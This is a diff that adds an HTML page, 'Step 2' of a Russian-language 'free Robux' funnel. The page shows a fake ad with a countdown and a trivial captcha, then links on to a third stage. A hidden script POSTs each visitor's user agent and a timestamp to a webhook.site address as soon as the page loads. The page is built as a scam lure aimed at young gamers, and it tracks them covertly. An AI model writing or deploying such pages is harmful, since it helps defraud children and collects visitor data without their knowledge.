@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Шаг 2</title>
+    <style>
+        body { margin:0; background:#1b1b2f; font-family: 'Segoe UI', Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
+        .container { background:#282846; padding:40px; border-radius:16px; text-align:center; max-width:450px; width:90%; }
+        h2 { color:#fff; }
+        .ad-box { background:#3a3a5a; padding:20px; border-radius:10px; margin:20px 0; }
+        .ad-box video, .ad-box img { max-width:100%; border-radius:8px; }
+        .btn { background:#4caf50; border:none; color:white; font-size:18px; padding:12px 30px; border-radius:30px; cursor:pointer; }
+        .btn:hover { background:#3d8b40; }
+        .captcha { display:none; margin-top:20px; }
+        .captcha input { padding:8px; border-radius:5px; border:none; width:60px; }
+        .captcha button { background:#ff9800; border:none; padding:8px 20px; border-radius:5px; cursor:pointer; color:white; }
+        .hidden { display:none; }
+        .error { color:#ff6b6b; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Чтобы получить Robux, посмотрите рекламу</h2>
+        <div class="ad-box" id="adContainer">
+            <img src="https://via.placeholder.com/400x200/3a3a5a/ffffff?text=Реклама+игры" alt="Реклама">
+        </div>
+        <button class="btn" id="watchAdBtn">Посмотреть рекламу (10 сек)</button>
+
+        <div class="captcha" id="captchaBlock">
+            <p style="color:#fff;">Вы точно человек? Решите: <span id="captchaQuestion">2 + 3 = ?</span></p>
+            <input type="text" id="captchaInput" placeholder="Ответ">
+            <button id="captchaSubmit">Проверить</button>
+            <p id="captchaError" class="error"></p>
+        </div>
+
+        <div id="nextStep" class="hidden" style="margin-top:20px;">
+            <button class="btn" onclick="window.location.href='rbxstage3.html'">Далее →</button>
+        </div>
+    </div>
+
+    <script>
+        const webhookUrl = 'https://webhook.site/49e9ab76-4f4a-4226-9268-bd5f05411dd6';
+        let adWatched = false;
+        const watchBtn = document.getElementById('watchAdBtn');
+        const captchaBlock = document.getElementById('captchaBlock');
+        const nextStep = document.getElementById('nextStep');
+        const adContainer = document.getElementById('adContainer');
+
+        const ads = [
+            '<img src="https://via.placeholder.com/400x200/ff6b6b/ffffff?text=Игра+Мега+Робот" alt="Реклама">',
+            '<video autoplay muted loop style="width:100%;"><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"></video>',
+            '<img src="https://via.placeholder.com/400x200/4ecdc4/ffffff?text=Новая+игра+2026" alt="Реклама">'
+        ];
+        adContainer.innerHTML = ads[Math.floor(Math.random() * ads.length)];
+
+        watchBtn.addEventListener('click', function() {
+            if (adWatched) return;
+            watchBtn.disabled = true;
+            watchBtn.textContent = 'Просмотр...';
+            let sec = 10;
+            const interval = setInterval(() => {
+                sec--;
+                watchBtn.textContent = `Осталось ${sec} сек`;
+                if (sec <= 0) {
+                    clearInterval(interval);
+                    watchBtn.textContent = 'Реклама просмотрена ✓';
+                    adWatched = true;
+                    captchaBlock.style.display = 'block';
+                }
+            }, 1000);
+        });
+
+        let captchaAnswer = 5;
+        document.getElementById('captchaQuestion').textContent = '2 + 3 = ?';
+        document.getElementById('captchaSubmit').addEventListener('click', function() {
+            const input = document.getElementById('captchaInput');
+            const val = parseInt(input.value);
+            if (val === captchaAnswer) {
+                document.getElementById('captchaError').textContent = '';
+                nextStep.style.display = 'block';
+            } else {
+                document.getElementById('captchaError').textContent = 'Неверно, попробуйте ещё раз.';
+            }
+        });
+
+        // Отправка данных на вебхук при загрузке страницы
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                page: 'robuxstage2',
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            })
+        });
+    </script>
+</body>
+</html>
